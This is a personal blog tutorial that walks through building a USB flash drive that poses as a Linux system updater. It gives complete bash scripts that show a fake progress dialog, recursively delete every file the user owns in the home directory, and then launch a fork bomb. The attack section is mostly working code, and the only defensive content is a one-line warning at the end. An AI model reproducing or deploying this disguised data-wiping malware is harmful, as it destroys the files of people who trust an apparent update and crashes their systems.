---
layout: post
title: "Basic Evil Flash Drive That Deletes Linux User's Data"
date: 2019-1-25
---

Today I'm going to be going over how to setup an evil flash drive that can easily destroy the data of whoever runs it. This is a simple program that is mainly coded from just with a few bash files. It will masquerade as an updating software inside a flash drive that will bring up a little pop up saying that it is installing computer updates. Finally, once it is done deleting files that are owned by the user, it will bring up a <a href="https://en.wikipedia.org/wiki/Fork_bomb">fork bomb</a> to crash the computer. Since I use Ubuntu as my main operating system, I'm mainly making this flash drive to target Linux systems. Making a flash drive that targets Windows systems would be slightly different, but the idea would remain the same.

<img style="margin-left: auto; margin-right: auto; width: 25%; height: 25%;" src="../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/updates.png" />

So lets jump right into it. I had a flash drive that I just reformatted into <a href="https://en.wikipedia.org/wiki/Ext4">ext4</a>. The first thing that I did was create a folder called "updates" in my flash drive, which would be used to hold majority of the code. My next task was to develop the updater pop-up that you see above. This was quite simple to create; all I did was use a program called <a href="https://en.wikipedia.org/wiki/Zenity">Zenity</a> to bring up the updating window. Zenity is a tool used to easily develop these dialog boxes using commands from the terminal. It was already installed by default on my Ubuntu machine, so it was my natural choice to create the dialog box. By running the below command, I was able to develop the window that you see above:

```
zenity --progress --pulsate --no-cancel --text="Updating..."
```

However, my usage of zenity caused a slight problem. What if this flash drive was going to be put into a system that didn't have Zenity installed? To solve this problem, I typed in this command to find the location of zenity:

```
whereis zenity
```

And got this output:

```
zenity: /usr/bin/zenity /usr/share/zenity /usr/share/man/man1/zenity.1.gz
```

So, I went ahead and copied the version of zenity located in /usr/bin/zenity to the updates folder located in my flash drive and renamed the program to "updater" so that it was less obvious that it was, in fact, not used for updating your computer. Now my flash drive could run the zenity program directly from the flash drive, which meant that even if this flash drive was put into a computer that did not have zenity installed, it could still run zenity.

After that, I needed a script that would run zenity from the flash drive, so I made a file called updates.sh inside the updates folder and put this code inside of it:
```
#!/bin/bash
cd "$(dirname "$0")"
./updater --progress --pulsate --no-cancel --text="Updating..."
```
All that this code does is cd into the current directory and run zenity (which I renamed to updater) using the flags that create the window that I wanted.

The next step was to create a bash file that could do actual damage to the system. Inside the updates folder, I made a file called "data.sh", which would be used to destroy the data. I added this code into the file:
```
#!/bin/bash
sleep 5
x=$(eval "whoami")
find $HOME -user $x -exec rm -rf {} \;
```
I added the "sleep 5" command so that the user could view the zenity window for five seconds before watching their files be utterly demolished. The next line of code figures out the user's username, which is needed to run the next command. The find command that comes right after that will find all of the documents that the user owns and deletes them one by one. I didn't use rm -rf /, which is the usual way that people delete files, because that requires root permissions to delete most of those files, and I wanted to be able to run this without asking the user for root permissions. That is why I instead use the find command to find files that the user owns instead of wasting my time with files that the user does not have permission to delete anyways.

I also downloaded an icon that looked sort of like an updating computer, and placed that under the updates folder. This icon will eventually be seen on the user's desktop.

The next thing I did was to go to the root of the flash drive directory (outside the /updates folder), and create a file called Autorun.inf. This is a special file that will tell the operating system certain information about this particular flash drive. I added these lines of code into this file:
```
[autorun]
Open=autorun.sh
Action=Start Updates
Label=Updater
Icon=updates/updater.png
```
This tells the operating system to open "autorun.sh" by default when this flash drive is connected, use the label of "Updater," and use the icon located in the updates folder. It looked something like the image below when I reconnected the flash drive.

<img style="margin-left: auto; margin-right: auto; width: 25%; height: 25%;" src="../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/icon.png" />

Finally, I only had one more little step to do. I just had to create an autorun.sh file that would run when the flash drive was inserted. (By default, linux will usually bring up a pop-up asking the user "Would you like to run the software on this flash drive?" for security reasons. Technically this will not be run right when the flash drive is inserted, but only after the user allows it to run. If it was not setup like this by default, then that could cause a huge security hole because a malicious user could insert a flash drive into any computer and run whatever they wanted.) I created an autorun.sh file at the root directory of my flash drive and put this inside it:
```
#!/bin/bash

cd "$(dirname "$0")"
cd updates

./data.sh | ./updates.sh
./updater --info --text="Your computer has finished all updates."

:(){:|:&};:
```
The first thing that this bash file does is that it changes into the directory of the updates folder. After that, it runs data.sh and updates.sh at the same time (The pipette is used so that when data.sh is done deleting all of the files, updates.sh will also stop as well). After that, it will use zenity to print out a message saying "Your computer has finished all updates." Then the code ends by delivering the fork bomb.
```
:() {
    :|:&
};
:
```

A fork bomb, in case you do not know, is a piece of bash code that will usually result in the computer crashing (although many operating systems today will have some defenses setup), and even if the computer doesn't crash, it will usually slow it down. When you break down the fork bomb, there are three main parts to it (as shown above). 1.) It defines a function called ":" using ":()". 2.) It opens the body of the function using the curly bracket. Inside the body of the function, it calls itself using ":|:&". The "&" is used to run something in the background, and the pipette can be used to run another command in the background, so ":|:&" makes the function call itself twice and background it. Each call to ":" spawns even more calls to ":", leading to an infinitely recursive process that slowly consumes the system resources. 3.) The program will then close the function using "};", then it will call the function with the last ":", which begins this whole process. For your convenience, A better looking version of the fork bomb is below:
```
foo() {
    call foo | call foo &
};
call foo
```
This pretty much wraps up this blog post. All I did now was just set all of my bash files to executable using the "chmod +x [file]" command. I ran the evil flash drive inside an Ubuntu virtual machine, and it worked perfectly. Everything in the user's home directory was demolished, and a pop up saying "Ubuntu experienced a system error" even came up.

<img src="../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/runsoftware.png" />

First it asked me whether I wanted to run the software (which was the security issue I mentioned earlier).

<img src="../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/updating.png" />

Then it started to show the pulsating update bar.

<img src="../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/doneupdating.png" />

Once it was done deleting all of my files (it didn't take too long, I didn't have much in my virtual machine), the updates bar was completely filled.

<img src="../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/finishedupdates.png" />

It states that I have completed all of my updates.

<img src="../../../assets/img/2019-1-25-flash-drive-that-deletes-everything/thereaintshit.png" />

As you can see, everything in my home folder is now gone. Also, the fork bomb that I implemented earlier is running in the background, making this virtual machine run a lot slower.

While this was just a basic program that could easily be built in a few minutes, much more advanced evil USBs have been built. For example, <a href="https://www.ncsc.gov.uk/content/files/protected_files/guidance_files/The-bad-USB-vulnerability1.pdf">these guys</a> were able to create a USB that could impersonate a different USB peripheral without the user noticing. This just goes to show that you should not plug in any USB flash drive unless you know that does not contain any malicious programs. You should especially never plug in a random USB that you found without knowing and trusting its source.

{% include related_posts.html %}
